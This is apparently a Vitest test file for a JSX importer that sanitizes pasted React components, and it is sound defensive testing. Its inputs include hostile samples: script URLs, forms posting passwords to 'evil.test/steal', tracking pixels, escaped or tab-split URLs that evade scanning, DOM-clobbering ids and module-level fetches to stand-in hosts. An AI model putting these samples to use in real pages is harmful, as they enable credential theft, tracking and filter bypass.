// @vitest-environment node
// Layer 1: what static JSX becomes, what it does not, and that the report says which.

import { readFileSync } from 'node:fs';
import path from 'node:path';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { renderComponentNode } from '@/lib/renderer/server/renderComponentNode';
import type { ComponentNode } from '@/lib/renderer/publish/hydrateBindings';
import { DETAILS, type ImportLine } from '../report';
import { importSource } from '../source';

const run = (text: string, name = 'paste.tsx') => importSource([{ name, text }]);
const lineOf = (text: string, detail: string): ImportLine | undefined => run(text).report.lines.find((line) => line.detail === detail);
const render = (node: ComponentNode | undefined) => renderToStaticMarkup(renderComponentNode(node as ComponentNode) as React.ReactElement);

describe('what converts', () => {
  it('reads elements, attributes, text and a verdict', () => {
    const { root, report } = run('<section id="s" aria-label="Go" data-track="1" tabIndex={0} hidden={false}><h1>Title</h1><label htmlFor="a">Name</label></section>');
    expect(report.verdict).toBe('imported');
    expect(report.counts.left).toBe(0);
    expect(root).toMatchObject({
      type: 'section',
      props: { id: 's', 'aria-label': 'Go', 'data-track': '1', tabIndex: 0, hidden: false },
      children: [{ type: 'h1', props: { children: 'Title' } }, { type: 'label', props: { htmlFor: 'a', children: 'Name' } }],
    });
  });

  it('gives every node a key from its place, which a line can name', () => {
    const { root, report } = run('<div><p>a</p>b<i /></div>');
    expect(root?.id).toBe('n-0');
    expect(root?.children?.map((child) => child.id)).toEqual(['n-0-0', 'n-0-1', 'n-0-2']);
    expect(report.lines.find((line) => line.excerpt === '<i />')?.nodeKey).toBe('n-0-2');
  });

  it('writes numbers in a style the way React does', () => {
    const { root } = run('<div style={{ padding: 16, lineHeight: 1.5, margin: 0 }} />');
    expect(root?.props?.style).toEqual({ padding: 16, lineHeight: 1.5, margin: 0 });
    expect(render(root)).toContain('padding:16px;line-height:1.5;margin:0');
  });

  it('reads text as React does, whitespace and character references both', () => {
    const text = (jsx: string) => run(jsx).root?.props?.children;
    expect(text('<p>\n  One line\n  and another\n</p>')).toBe('One line and another');
    expect(text('<p>a &amp; b &#65;&#x42; &nbsp;c</p>')).toBe('a & b AB  c');
    expect(run('<p title="a &amp; b" />').root?.props?.title).toBe('a & b');
    expect(text('<p>{"literal"}</p>')).toBe('literal');
    expect(text('<p>{7}</p>')).toBe(7);
    expect(render(run('<p>Hello <b>bold</b> world</p>').root)).toBe('<p>Hello <b>bold</b> world</p>');
  });

  it('renders nothing for what React renders nothing for', () => {
    const { root, report } = run('<p>{null}{false}{undefined}{/* note */}x</p>');
    expect(root?.props?.children).toBe('x');
    expect(report.verdict).toBe('imported');
  });

  it('opens a fragment, and drops key', () => {
    const { root, report } = run('<div><><p key="a">1</p><p key={b}>2</p></></div>');
    expect(root?.children?.map((child) => child.props?.children)).toEqual(['1', '2']);
    expect(root?.children?.[0].props).not.toHaveProperty('key');
    expect(report.verdict).toBe('imported');
  });

  it('reads constants and claims what it read', () => {
    const { root, report } = run('const label = "Hi";\nconst unused = 1;\n<a href={`/x/${label}`} title={label}>{label}</a>');
    expect(root).toMatchObject({ type: 'a', props: { href: '/x/Hi', title: 'Hi', children: 'Hi' } });
    expect(report.verdict).toBe('imported');
    const left = report.lines.filter((line) => line.disposition === 'left');
    expect(left).toHaveLength(1);
    expect(left[0].line).toBe(2);
  });

  it('reads a default export, a sole export, and a sole component, and each form of function', () => {
    expect(run('export default function Card() { return <p>x</p>; }').root?.type).toBe('p');
    expect(run('export default function () { return <p>x</p>; }').root?.type).toBe('p');
    expect(run('const Card = () => <p>x</p>;\nexport default Card;').root?.type).toBe('p');
    expect(run('export const Card = function () { return (<p>x</p>); };').root?.type).toBe('p');
    expect(run('function Card() { const t = "x"; return <p>{t}</p>; }').root).toMatchObject({ props: { children: 'x' } });
    expect(run('function Inner() { return <i />; }\nexport function Card() { return <p />; }').root?.type).toBe('p');
  });

  it('inlines a local component with no props, in its own scope', () => {
    const text = 'const x = "file";\nfunction Inner() { return <i title={x} />; }\nexport default function Card() { const x = "local"; return <div title={x}><Inner /><Inner /></div>; }';
    const { root, report } = run(text);
    expect(root).toMatchObject({ props: { title: 'local' }, children: [{ type: 'i', props: { title: 'file' } }, { type: 'i' }] });
    expect(root?.children?.map((child) => child.id)).toEqual(['n-0-0', 'n-0-1']);
    expect(report.verdict).toBe('imported');
  });

  it('wraps several roots, and says so', () => {
    const { root, report } = run('<><p>a</p><p>b</p></>');
    expect(root).toMatchObject({ type: 'div', children: [{ type: 'p' }, { type: 'p' }] });
    expect(report.verdict).toBe('imported-with-differences');
    expect(report.lines.some((line) => line.detail === DETAILS.wrapper && line.disposition === 'adapted')).toBe(true);
  });

  it('keeps a style with an external address, and needs an accept for it', () => {
    const { root, report } = run('<div style={{ backgroundImage: "url(https://evil.test/x.png)" }} />');
    expect(root?.props?.style).toEqual({ backgroundImage: 'url(https://evil.test/x.png)' });
    expect(report.verdict).toBe('imported-with-differences');
    expect(report.lines.find((line) => line.kind === 'external-address')).toMatchObject({ disposition: 'adapted', next: ['accept'] });
  });

  it('judges a value-checked attribute by its value, not by the name alone', () => {
    const animate = (name: string) => run(`<svg><animate attributeName="${name}" /></svg>`).report.verdict;
    expect(animate('opacity')).toBe('imported');
    expect(animate('href')).toBe('not-imported');
  });

  it('does not count a relative address as external', () => {
    expect(run('<div style={{ backgroundImage: "url(/x.png)" }} />').report.verdict).toBe('imported');
  });
});

describe('what stays left, and blocks placing', () => {
  it.each<[string, string, string, string]>([
    ['a class', '<div className="a" />', 'class', DETAILS.classPending],
    ['a handler', '<button onClick={() => {}}>Go</button>', 'handler', DETAILS.handler],
    ['a spread', '<div {...p} />', 'spread', DETAILS.spread],
    ['a ref', '<div ref={r} />', 'attribute', DETAILS.ref],
    ['a dynamic attribute', '<a href={x} />', 'attribute', DETAILS.dynamicAttribute],
    ['a dynamic child', '<p>{x}</p>', 'expression', DETAILS.dynamicChild],
    ['a loop', '<ul>{a.map((n) => <li>{n}</li>)}</ul>', 'expression', DETAILS.dynamicChild],
    ['a condition', '<div>{a && <p />}</div>', 'expression', DETAILS.dynamicChild],
    ['an unknown component', '<div><Card /></div>', 'unknown-component', DETAILS.unknownComponent],
    ['a member component', '<div><A.B /></div>', 'unknown-component', DETAILS.unknownComponent],
    ['children as an attribute', '<div children="x" />', 'attribute', DETAILS.childrenAttribute],
    ['a local component with attributes', 'function B() { return <i />; }\n<div><B a="1" /></div>', 'unknown-component', DETAILS.componentWithProps],
    ['a local component with children', 'function B() { return <i />; }\n<div><B>x</B></div>', 'unknown-component', DETAILS.componentWithProps],
    ['a local component that takes props', 'function B(p) { return <i />; }\n<div><B /></div>', 'unknown-component', DETAILS.componentWithProps],
    ['a platform marker', '<div data-component-kind="collection" />', 'refused-attribute', DETAILS.platformAttribute],
    ['a form marker', '<div data-form-kind="form" />', 'refused-attribute', DETAILS.platformAttribute],
    ['an internal state attribute', '<div data-fcs-x="1" />', 'refused-attribute', DETAILS.platformAttribute],
    ['a behaviour attribute', '<div data-u-x="1" />', 'refused-attribute', DETAILS.platformAttribute],
    ['raw html', '<div dangerouslySetInnerHTML={{ __html: "<b>" }} />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a stored behaviour', '<div behaviour={{ state: [] }} />', 'refused-attribute', DETAILS.refusedAttribute],
    ['stored rules', '<div rules={[]} />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a prototype attribute', '<div __proto__="x" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['an inline handler string', '<div onclick="x()" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a script address', '<a href="javascript:alert(1)" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a spelled script address', '<a href="java\tscript:alert(1)" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a script address from a constant', 'const h = "javascript:x";\n<a href={h} />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a reserved id', '<div id="__next_f" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a member name on an image', '<img id="title" name="x" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a member of its form as an id', '<input id="parentElement" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['an id in another case', '<img ID="createElement" name="x" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['a class in another case', '<div CLASS="fixed inset-0" />', 'refused-attribute', DETAILS.refusedAttribute],
    ['an image outside svg', '<div><image href="x" /></div>', 'refused-tag', DETAILS.refusedTag],
    ['an html tag directly in svg', '<svg><p>x</p></svg>', 'refused-tag', DETAILS.refusedTag],
    ['an image in an svg desc', '<svg><desc><image href="x" /></desc></svg>', 'refused-tag', DETAILS.refusedTag],
    ['a style that declares twice', '<div style={{ color: "red;background:url(x)" }} />', 'refused-attribute', DETAILS.refusedStyle],
    ['a style that is no object', '<div style="color:red" />', 'refused-attribute', DETAILS.refusedStyle],
    ['a script tag', '<div><script>alert(1)</script></div>', 'refused-tag', DETAILS.refusedTag],
    ['a style tag', '<div><style>{"a{}"}</style></div>', 'refused-tag', DETAILS.refusedTag],
    ['an iframe', '<div><iframe src="x" /></div>', 'refused-tag', DETAILS.refusedTag],
    ['a namespaced tag', '<div><a:b /></div>', 'refused-tag', DETAILS.refusedTag],
    ['a document title', '<div><title>x</title></div>', 'refused-tag', DETAILS.refusedTag],
    ['a form with a handler', '<form onSubmit={f} />', 'element', DETAILS.form],
    ['a form with an action', '<form action="/x" />', 'element', DETAILS.form],
    ['a form with a spread', '<form {...p} />', 'element', DETAILS.form],
    ['text in a table', '<table>Hello</table>', 'expression', DETAILS.bareText],
    ['text in a table through a fragment', '<table><>Hello</></table>', 'expression', DETAILS.bareText],
    ['text in a void element', '<br>x</br>', 'expression', DETAILS.voidChildren],
    ['an unknown character reference', '<p>&zzzz;</p>', 'expression', DETAILS.entity],
  ])('%s', (_name, text, kind, detail) => {
    const { report } = run(text);
    expect(report.verdict).toBe('not-imported');
    const line = report.lines.find((each) => each.detail === detail);
    expect(line).toMatchObject({ kind, disposition: 'left' });
    expect(line?.nodeKey).toBeDefined();
  });

  it('takes a script address nowhere, whatever the verdict', () => {
    expect(run('<a href="javascript:alert(1)">x</a>').root?.props).not.toHaveProperty('href');
  });

  it('keeps nothing of a refused tag, and reports what sat inside it as one', () => {
    const { root, report } = run('<div><script src="x">{y}</script></div>');
    expect(root?.children).toBeUndefined();
    expect(report.lines.filter((line) => line.disposition === 'left')).toHaveLength(1);
  });

  it('keeps a title inside an svg, and not inside its foreign object', () => {
    expect(run('<svg><title>Chart</title></svg>').report.verdict).toBe('imported');
    expect(run('<svg><foreignObject><title>x</title></foreignObject></svg>').report.verdict).toBe('not-imported');
  });

  it('reads no island by name: only the normal form does', () => {
    expect(run('<Form as="div" />').report.lines.find((line) => line.kind === 'unknown-component')).toBeDefined();
    expect(run('<div><TextRun bindings={{}}>x</TextRun></div>').report.verdict).toBe('not-imported');
  });
});

describe('a body that decides', () => {
  it.each([
    ['an early return', 'function C() { if (x) return null; return <p />; }'],
    ['a hook call', 'function C() { useEffect(() => {}); return <p />; }'],
    ['a loop', 'function C() { for (;;) {} return <p />; }'],
    ['a statement in front of a pasted fragment', 'if (x) throw y;\n<p />'],
  ])('%s blocks placing', (_name, text) => {
    expect(run(text).report.verdict).toBe('not-imported');
  });

  it('leaves an async or generator component', () => {
    expect(run('async function C() { return <p />; }').root).toBeUndefined();
    expect(run('function* C() { return <p />; }').root).toBeUndefined();
  });

  it('leaves what returns something other than markup', () => {
    expect(run('function C() { return a ? <p /> : <i />; }').root).toBeUndefined();
    expect(run('function C() { return null; }').root).toBeUndefined();
    expect(run('function C() { }').root).toBeUndefined();
  });

  it('reads an unused prop as harmless and a read one as left', () => {
    expect(run('function C(p) { return <p />; }').report.verdict).toBe('imported');
    expect(run('function C(title) { return <p>{title}</p>; }').report.verdict).toBe('not-imported');
    expect(run('const t = "x"; function C({ t }) { return <p title={t} />; }').report.verdict).toBe('not-imported');
  });

  it('asks for a usage when several components sit in one file', () => {
    const line = lineOf('function A() { return <p />; }\nfunction B() { return <i />; }', DETAILS.familyNoEntry);
    expect(line).toMatchObject({ kind: 'unknown-component', next: ['add-entry'] });
  });
});

describe('the ledger is total', () => {
  const button = readFileSync(path.resolve(__dirname, '../../../components/ui/button.tsx'), 'utf8');

  it('lists a real file, and every atom of it once', () => {
    const { report } = run(button, 'button.tsx');
    const atoms = report.lines.flatMap((line) => line.atoms);
    expect(new Set(atoms).size).toBe(atoms.length);
    expect(atoms.length).toBeGreaterThan(100);
    for (const line of report.lines) {
      expect(line.line).toBeGreaterThanOrEqual(1);
      expect(line.endLine).toBeGreaterThanOrEqual(line.line);
    }
    expect(report.verdict).toBe('not-imported');
  });

  it('keeps every construct, claimed or not, in the counts', () => {
    const { report } = run('import x from "y";\n/** doc */\nfunction C(p: string = "a"): string { return <p {...p} key="k">t</p>; }');
    expect(report.counts.converted + report.counts.left + report.counts.adapted).toBe(report.lines.length);
    expect(report.lines.find((line) => line.kind === 'import')?.disposition).toBe('left');
  });

  it('counts a construct inlined twice once', () => {
    const { report } = run('function B() { return <i />; }\nfunction A() { return <div><B /><B /></div>; }\nexport default A;');
    const atoms = report.lines.flatMap((line) => line.atoms);
    expect(new Set(atoms).size).toBe(atoms.length);
  });
});

const verdict = (text: string) => run(text).report.verdict;

describe('a name in another case', () => {
  it.each([
    ['<form ACTION="http://evil.test/steal"><input name="pw" /><button>go</button></form>'],
    ['<form Action="http://evil.test/steal" />'],
    ['<form ONSUBMIT="x" />'],
    ['<img ID="createElement" name="x" src="a.png" />'],
    ['<img Id="querySelector" name="x" src="a.png" />'],
    ['<div CLASS="fixed inset-0 z-50">x</div>'],
    ['<div classname="fixed inset-0" />'],
    ['<div ClassName="fixed inset-0" />'],
    ['<div STYLE={{ background: "url(http://evil.test/a.png)" }} />'],
    ['<div Style={{ color: "red" }} />'],
    ['<div CHILDREN={{ type: "script", props: {} }} />'],
    ['<div KEY="x" />'],
    ['<div REF="x" />'],
    ['<a ACTION="x" />'],
    ['<button FORMACTION="http://evil.test/" />'],
    ['<input FoRm="f" />'],
  ])('%s', (text) => {
    expect(verdict(text)).toBe('not-imported');
  });

  it('stores nothing a keyed name carries', () => {
    expect(run('<div><img ID="createElement" /></div>').root?.children?.[0]?.props).not.toHaveProperty('ID');
    expect(run('<div CLASS="fixed" />').root?.props).not.toHaveProperty('CLASS');
    expect(run('<div STYLE={{ color: "red" }} />').root?.props).not.toHaveProperty('STYLE');
  });

  it('keeps the case of a name SVG needs', () => {
    const { root, report } = run('<svg viewBox="0 0 10 10" fill="none"><title>x</title><path d="M0 0" stroke="currentColor" strokeWidth={2} /></svg>');
    expect(report.verdict).toBe('imported');
    expect(root?.props).toHaveProperty('viewBox', '0 0 10 10');
    expect(root?.children?.[1].props).toHaveProperty('strokeWidth', 2);
  });

  it('reads a tag in any case the same way', () => {
    expect(verdict('<BR>x</BR>')).toBe('not-imported');
    expect(verdict('<bR>x</bR>')).toBe('not-imported');
    expect(verdict('<iNpUt>x</iNpUt>')).toBe('not-imported');
    expect(verdict('<tAbLe>x</tAbLe>')).toBe('not-imported');
    expect(verdict('<sVg><script /></sVg>')).toBe('not-imported');
    expect(verdict('<fOrM action="/x" />')).toBe('not-imported');
    expect(verdict('<sVg><title>hi</title></sVg>')).toBe('imported');
  });
});

describe('form logic off the form', () => {
  it.each([
    ['formAction', '<form><input name="pw" /><button formAction="http://evil.test/steal">go</button></form>'],
    ['formMethod', '<button formMethod="post">go</button>'],
    ['formTarget', '<button formTarget="_blank">go</button>'],
    ['formEncType', '<button formEncType="text/plain">go</button>'],
    ['form, joining one from anywhere', '<div><input form="other" name="pw" /></div>'],
    ['form on a button', '<button form="other">go</button>'],
    ['lower case', '<button formaction="http://evil.test/">go</button>'],
  ])('%s', (_name, text) => {
    const { report } = run(text);
    expect(report.verdict).toBe('not-imported');
    expect(report.lines.find((line) => line.detail === DETAILS.form)).toMatchObject({ kind: 'element', disposition: 'left' });
  });

  it('leaves a plain form with plain controls alone', () => {
    expect(verdict('<form><input name="pw" /><button>go</button></form>')).toBe('imported');
  });
});

describe('a planted external address', () => {
  const external = (text: string) => run(text).report.lines.find((line) => line.kind === 'external-address');

  it.each([
    ['plain', String.raw`<div style={{ background: "url(http://evil.test/a.png)" }} />`],
    ['with no scheme', String.raw`<div style={{ background: "url(//evil.test/a.png)" }} />`],
    ['quoted', String.raw`<div style={{ background: 'url("http://evil.test/a.png")' }} />`],
    ['after a space', String.raw`<div style={{ background: "url(  http://evil.test/a.png)" }} />`],
    ['behind a first image', String.raw`<div style={{ background: "url(x.png), url(http://evil.test/a.png)" }} />`],
    ['second in an image-set', String.raw`<div style={{ backgroundImage: 'image-set("x.png" 9x, "http://evil.test/b.png" 1x)' }} />`],
    ['second in a webkit image-set', String.raw`<div style={{ backgroundImage: '-webkit-image-set("x.png" 9x, "http://evil.test/b.png" 1x)' }} />`],
    ['through a custom property', String.raw`<div style={{ "--u": '"http://evil.test/c.png"', backgroundImage: "image-set(var(--u) 1x)" }} />`],
    ['indirect, with the property elsewhere', String.raw`<div style={{ backgroundImage: "image-set(var(--u) 1x)" }} />`],
    ['in a cross-fade', String.raw`<div style={{ backgroundImage: 'cross-fade("http://evil.test/cf.png" 50%, "x.png")' }} />`],
    ['an escape inside a string', String.raw`<div style={{ background: 'url("\\68ttp://evil.test/a.png")' }} />`],
    ['an image', '<img src="http://evil.test/pixel.gif" />'],
    ['an image with no scheme', '<img src="//evil.test/pixel.gif" />'],
    ['a source set', '<img srcSet="/a.png 1x, http://evil.test/p.gif 2x" />'],
    ['a video', '<video src="http://evil.test/v.mp4" />'],
    ['a poster', '<video poster="http://evil.test/p.gif" />'],
    ['an svg use', '<svg><use href="http://evil.test/s.svg#a" /></svg>'],
    ['an svg image', '<svg><image href="http://evil.test/a.png" /></svg>'],
    ['a constant', 'const a = "http://evil.test/p.gif";\n<img src={a} />'],
    ['a name in another case', '<img SRC="http://evil.test/p.gif" />'],
  ])('%s needs an accept', (_name, text) => {
    expect(external(text)).toMatchObject({ disposition: 'adapted', next: ['accept'] });
    expect(verdict(text)).toBe('imported-with-differences');
  });

  it.each([
    ['in the name', String.raw`<div style={{ background: "u\\72l(http://evil.test/a.png)" }} />`],
    ['in the address', String.raw`<div style={{ background: "url(\\68ttp://evil.test/a.png)" }} />`],
    ['a raw newline in a string', String.raw`<div style={{ background: 'url("a\nb")' }} />`],
  ])('refuses a value hidden from the scan, %s', (_name, text) => {
    const line = lineOf(text, DETAILS.refusedStyle);
    expect(line).toMatchObject({ kind: 'refused-attribute', disposition: 'left' });
  });

  it.each([
    ['a local image', '<img src="/a.png" alt="" />'],
    ['a relative one', '<img src="a.png" srcSet="a.png 1x, b.png 2x" />'],
    ['a data image', '<img src="data:image/png;base64,AAAA" />'],
    ['a link', '<a href="https://example.test/">x</a>'],
    ['a fragment in svg', '<svg><use href="#a" /></svg>'],
    ['a local style image', '<div style={{ background: "url(/a.png)" }} />'],
    ['an escape in a string that means nothing here', String.raw`<p style={{ quotes: '"\\201C" "\\201D"' }} />`],
  ])('%s stays clean', (_name, text) => {
    expect(verdict(text)).toBe('imported');
  });
});

describe('a statement that can change what renders', () => {
  const writer = (body: string) => `const o = { a: "before" };\n${body}\nexport default function A() { return <div title={o.a} />; }`;

  it.each([
    ['an alias', 'const p = o;\np.a = "after";'],
    ['an array pattern', '[o.a] = ["after"];'],
    ['an object pattern', '({ x: o.a } = { x: "after" });'],
    ['a for target', 'for (o.a of ["after"]);'],
    ['a for-in target', 'for (o.a in { after: 1 });'],
    ['new', 'new Mutate(o);'],
    ['a tagged template', 'mutate`${o}`;'],
    ['an assignment', 'o.a = "after";'],
    ['an assignment in a declaration', 'const z = (o.a = "after");'],
  ])('%s stores no stale value', (_name, body) => {
    const { report, root } = run(writer(body));
    expect(report.verdict).toBe('not-imported');
    expect(root?.props).not.toHaveProperty('title', 'before');
  });

  it.each([
    ['a bare import', 'import "evil-package";\nexport default function A() { return <div />; }'],
    ['a call at module level', 'fetch("https://evil.example/");\nexport default function A() { return <div />; }'],
    ['a write at module level', 'document.title = "x";\nexport default function A() { return <div />; }'],
    ['a call in a module constant', 'const x = track();\nexport default function A() { return <div />; }'],
    ['new in a module constant', 'const x = new Thing();\nexport default function A() { return <div />; }'],
    ['an effect kept in a constant', 'export default function A() { const a = useLayoutEffect(() => { document.body.innerHTML = ""; }); return <div />; }'],
    ['state nobody reads', 'export default function A() { const [x, setX] = useState(0); return <div />; }'],
    ['a write in a declaration', 'export default function A() { const a = (document.title = "x"); return <div />; }'],
    ['await', 'export default function A() { const a = await b; return <div />; }'],
    ['in front of a fragment', 'document.title = "x";\n<div />'],
    ['a class with a computed base', 'class A extends mixin() {}\n<div />'],
  ])('%s blocks placing', (_name, text) => {
    const { report } = run(text);
    expect(report.verdict).toBe('not-imported');
    expect(report.lines.some((line) => line.detail === DETAILS.leftInTree)).toBe(true);
  });

  it.each([
    ['a display name', 'export default function Button() { return <button>x</button>; }\nButton.displayName = "Button";'],
    ['a directive', '"use client";\nexport default function A() { return <div />; }'],
    ['imports and types', 'import * as React from "react";\ntype Props = { label?: string };\ninterface P {}\nexport default function A() { return <div />; }'],
    ['a function that holds a call, which has not run', 'const h = () => fetch("/x");\nfunction g() { fetch("/x"); }\nexport default function A() { return <div />; }'],
    ['an export list', 'function A() { return <div />; }\nexport { A };'],
  ])('%s does not block', (_name, text) => {
    expect(verdict(text)).toBe('imported');
  });

  it('claims only what it knows about a left line', () => {
    const line = run('function C(title) { return <p>{title}</p>; }').report.lines.find((each) => each.excerpt === 'title' && each.nodeKey === undefined);
    expect(line?.detail).toBe(DETAILS.left);
    expect(DETAILS.left).not.toMatch(/reads/);
  });
});

describe('what a real component stays', () => {
  it('a button with a style, an entity and a display name', () => {
    const text = 'import * as React from "react";\ntype Props = { label?: string };\nexport default function Button() {\n  return (\n    <button type="button" aria-label="Save" style={{ padding: 8, color: "red" }}>\n      Save &amp; close\n    </button>\n  );\n}\nButton.displayName = "Button";';
    expect(verdict(text)).toBe('imported');
  });

  it('an arrow component', () => {
    expect(verdict('const Card = () => (\n  <article>\n    <h2>Title</h2>\n    <p>Text {"more"}</p>\n    <img src="/a.png" alt="" />\n  </article>\n);\nexport default Card;')).toBe('imported');
  });

  it('two roots, with the wrapper said', () => {
    expect(verdict('<>\n  <h1>Hello</h1>\n  <p>World</p>\n</>')).toBe('imported-with-differences');
  });
});

describe('platform attributes the editor reads', () => {
  it.each(['data-ground-wrapper-id', 'data-editor-ui', 'data-breakpoint-id', 'data-viewport-id', 'data-ground', 'data-floating-root-id', 'data-preview-frame', 'data-fx-a', 'data-fx-st', 'data-fx-p', 'data-fx-in', 'data-fx-on'])('%s', (name) => {
    expect(lineOf(`<div ${name}="x" />`, DETAILS.platformAttribute)).toMatchObject({ kind: 'refused-attribute' });
    expect(lineOf(`<div ${name.toUpperCase()}="x" />`, DETAILS.platformAttribute)).toBeDefined();
  });

  it('leaves an author own data attribute alone', () => {
    expect(verdict('<div data-state="open" data-slot="x" data-testid="y" />')).toBe('imported');
  });
});

describe('values with no stored form', () => {
  it.each([['<p>{1e999}</p>'], ['<p>{-1e999}</p>'], ['<i tabIndex={1e999} />']])('%s', (text) => {
    expect(verdict(text)).toBe('not-imported');
  });
});

describe('a stylesheet beside the component', () => {
  it('blocks until a sheet is read', () => {
    const { report, root } = importSource([{ name: 'a.tsx', text: '<div />' }, { name: 'a.css', text: 'div{display:none}' }]);
    expect(root?.type).toBe('div');
    expect(report.verdict).toBe('not-imported');
    expect(report.lines.find((line) => line.detail === DETAILS.stylesheet)?.nodeKey).toBe('n-0');
  });

  it('does not block for a file that cannot style anything', () => {
    expect(importSource([{ name: 'a.tsx', text: '<div />' }, { name: 'a.png', text: 'xx' }]).report.verdict).toBe('imported');
  });
});

describe('the output depth', () => {
  const deep = (levels: number, each: number) => {
    const lines = Array.from({ length: levels }, (_, i) => `function C${i}() { return ${'<b>'.repeat(each)}${i + 1 < levels ? `<C${i + 1} />` : ''}${'</b>'.repeat(each)}; }`);
    return `${lines.join('\n')}\n<C0 />`;
  };

  it('counts what inlining multiplies', () => {
    const { report, root } = run(deep(16, 240));
    expect(root).toBeUndefined();
    expect(report.lines.find((line) => line.detail === DETAILS.overDepth)?.kind).toBe('cap');
  });

  it('takes what fits', () => {
    expect(verdict(deep(2, 100))).toBe('imported');
  });

});

describe('an address a browser reads differently from its text', () => {
  const external = (text: string) => run(text).report.lines.find((line) => line.kind === 'external-address');

  it.each([
    ['a tab between the slashes', '<img src="/&#9;/evil.test/a.png" />'],
    ['a tab in the scheme', '<img src="ht&#9;tp://evil.test/b.png" />'],
    ['a line break in the scheme', '<img src={"ht\\ntp://evil.test/c.png"} />'],
    ['a return between the slashes', '<img src={"/\\r/evil.test/c.png"} />'],
    ['a poster', '<video poster="/&#9;/evil.test/e.png" />'],
    ['an svg image', '<svg><image href="/&#9;/evil.test/f.png" /></svg>'],
    ['a css escape in a string', String.raw`<div style={{ background: 'url("/\\9 /evil.test/g.png")' }} />`],
    ['a raw tab in a string', '<div style={{ background: \'url("/\t/evil.test/h.png")\' }} />'],
    ['escapes in the scheme too', String.raw`<div style={{ background: 'url("ht\\9 tp:/\\9 /evil.test/i.png")' }} />`],
    ['an escape in an image-set', String.raw`<div style={{ backgroundImage: 'image-set("/\\9 /evil.test/j.png" 1x)' }} />`],
    ['feImage, a plain address', '<svg><filter id="f"><feImage href="http://evil.test/k.png" /></filter><rect filter="url(#f)" /></svg>'],
    ['feImage through xlinkHref', '<svg><filter id="f"><feImage xlinkHref="http://evil.test/k.png" /></filter></svg>'],
    ['an href on an element nobody listed', '<svg><pattern href="http://evil.test/p.svg#a" /></svg>'],
  ])('%s', (_name, text) => {
    expect(external(text)).toMatchObject({ disposition: 'adapted', next: ['accept'] });
  });

  it.each([
    ['a link', '<a href="https://example.test/">x</a>'],
    ['an image map area', '<map name="m"><area href="https://example.test/" /></map>'],
    ['an svg link', '<svg><a href="https://example.test/"><text>x</text></a></svg>'],
    ['a local use', '<svg><use href="#a" /></svg>'],
    ['a tab in a relative path', '<img src="a&#9;b.png" />'],
  ])('%s stays clean', (_name, text) => {
    expect(verdict(text)).toBe('imported');
  });
});

describe('recheck, statements', () => {
  it('reads a display name write on anything but a component as a write', () => {
    const { report, root } = run('const o = { displayName: "before" };\nconst p = cond ? o : o;\np.displayName = "after";\nexport default function A() { return <div title={o.displayName} />; }');
    expect(report.verdict).toBe('not-imported');
    expect(report.lines.some((line) => line.detail === DETAILS.leftInTree)).toBe(true);
    expect(root?.props).toBeDefined();
  });

  it('keeps a display name on a component in either form', () => {
    expect(verdict('const B = () => <i />;\nB.displayName = "B";\nexport default B;')).toBe('imported');
    expect(verdict('function B() { return <i />; }\nB.displayName = "B";\nexport default B;')).toBe('imported');
  });

  it.each([
    ['an enum with an effect', 'enum E { A = (document.title = "x").length }\n<div />'],
    ['an enum with a call', 'enum E { A = f() }\n<div />'],
    ['a class decorator', '@evil class K {}\n<div />'],
    ['a decorator with a call', '@evil() class K {}\n<div />'],
    ['a method decorator', 'class K { @evil m() {} }\n<div />'],
    ['a static block', 'class K { static { document.title = "x"; } }\n<div />'],
    ['a static field', 'class K { static a = f(); }\n<div />'],
  ])('%s blocks placing', (_name, text) => {
    expect(verdict(text)).toBe('not-imported');
  });

  it.each([
    ['a plain enum', 'enum E { A, B = 2 }\n<div />'],
    ['a re-export, which is a named import', 'export * from "evil-package";\n<div />'],
    ['an import through require', 'import x = require("evil-package");\n<div />'],
    ['a plain class', 'class K { m() { fetch("/x"); } }\n<div />'],
  ])('%s does not block', (_name, text) => {
    expect(verdict(text)).toBe('imported');
  });
});

describe('sheets of any spelling', () => {
  it.each(['a.css', 'a.CSS', 'a.scss', 'a.sass', 'a.less'])('%s blocks', (name) => {
    const { report } = importSource([{ name: 'a.tsx', text: '<div />' }, { name, text: 'div{display:none}' }]);
    expect(report.verdict).toBe('not-imported');
  });
});

describe('prose with the marks that blind a token scan', () => {
  it.each([
    ['a quote', `<p>don't</p>`],
    ['a double quote', '<p>say "hi</p>'],
    ['a link in text', '<p>http://example.com</p>'],
    ['a comment opener in text', '<p>see /* here</p>'],
    ['a backtick', '<p>`</p>'],
    ['a button with a quote', 'export default function B() { return <button>Don\'t save</button>; }\nB.displayName = "B";'],
  ])('%s still imports', (_name, text) => {
    expect(verdict(text)).toBe('imported');
  });
});
